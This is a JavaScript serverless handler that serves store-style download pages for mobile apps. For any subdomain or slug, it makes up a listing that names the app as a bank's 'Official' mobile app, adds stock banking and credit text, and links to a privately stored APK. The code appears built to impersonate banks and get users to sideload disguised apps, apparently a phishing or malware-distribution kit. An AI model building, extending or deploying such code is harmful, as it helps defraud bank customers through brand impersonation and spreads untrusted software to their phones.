import { get } from '@vercel/blob';
import { buildStandaloneHtml } from '../lib/template.js';

const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

export default async function handler(request, response) {
	const url = new URL(request.url, `https://${request.headers.host}`);
	let slug = url.searchParams.get('slug');

	// If no query slug, check path /app/:slug
	if (!slug) {
		const pathSegments = url.pathname.split('/').filter(Boolean);
		if (pathSegments.length > 1 && pathSegments[0] === 'app') {
			slug = pathSegments[1];
		}
	}

	// If no path slug, check subdomain
	if (!slug) {
		const host = (request.headers.host || '').toLowerCase();
		if (host.endsWith('.vercel.app')) {
			const sub = host.replace('.vercel.app', '').split('.')[0];
			if (sub && !sub.startsWith('playstore-web-143')) {
				slug = sub;
			}
		}
	}

	if (!slug || !/^[a-z0-9-]+$/.test(slug)) {
		slug = 'app';
	}

	try {
		const options = { access: 'private' };
		if (blobToken) options.token = blobToken;

		let appData = null;
		try {
			const blob = await get(`apps/${slug}.json`, options);
			if (blob && blob.stream) {
				const text = await new Response(blob.stream).text();
				appData = JSON.parse(text);
			}
		} catch (e) {
			console.warn(`Blob apps/${slug}.json read error:`, e.message);
		}

		if (!appData) {
			// Check if raw logo binary exists in blob store directly
			let logoUrl = '';
			try {
				const logoBlob = await get(`apps/${slug}/logo`, options);
				if (logoBlob?.stream) {
					const buf = Buffer.from(await new Response(logoBlob.stream).arrayBuffer());
					if (buf.length > 0) {
						logoUrl = `data:${logoBlob.contentType || 'image/jpeg'};base64,${buf.toString('base64')}`;
					}
				}
			} catch {}

			const name = slug.split('-')[0];
			const formattedName = name ? (name.charAt(0).toUpperCase() + name.slice(1)) : 'App';
			appData = {
				name: formattedName,
				developer: `${formattedName} Official`,
				tagline: 'Secure Mobile Banking & Financial Services',
				description: `Official ${formattedName} mobile app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
				version: '2.4.1',
				logoUrl: logoUrl || '',
				apkUrl: `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`,
				slug,
			};
		}

		const html = buildStandaloneHtml(appData);
		response.setHeader('Content-Type', 'text/html; charset=utf-8');
		response.setHeader('Cache-Control', 'public, s-maxage=31536000, stale-while-revalidate=86400');
		return response.status(200).send(html);
	} catch (error) {
		console.error('SSR Render error:', error);
		return response.status(500).send('Server Error rendering page');
	}
}
